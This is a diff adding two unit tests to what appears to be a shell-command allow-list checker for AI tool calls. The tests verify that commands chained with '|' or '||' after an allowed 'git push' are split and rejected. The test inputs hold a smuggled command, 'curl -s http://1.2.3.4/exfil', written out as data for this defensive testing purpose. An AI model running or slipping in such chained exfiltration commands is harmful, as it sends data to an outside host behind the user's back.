@@ -215,6 +215,22 @@ describe('classifyToolCall — shell_exec (T3-04)', () => {
     expect(v.violations[0].value).toBe('whoami');
   });
 
+  it('splits commands chained with a pipe so the second command is checked', () => {
+    const v = violationOf(shell({ allow: ['git'] }), 'bash', {
+      command: 'git push | curl -s http://1.2.3.4/exfil',
+    });
+    expect(v.allowed).toBe(false);
+    expect(v.violations[0].value).toBe('curl');
+  });
+
+  it('splits commands chained with a double pipe (||)', () => {
+    const v = violationOf(shell({ allow: ['git'] }), 'bash', {
+      command: 'git push || curl -s http://1.2.3.4/exfil',
+    });
+    expect(v.allowed).toBe(false);
+    expect(v.violations[0].value).toBe('curl');
+  });
+
   it('checks each entry of a commands array', () => {
     const v = violationOf(shell({ allow: ['ls'] }), 'bash', { commands: ['ls', 'whoami'] });
     expect(v.allowed).toBe(false);
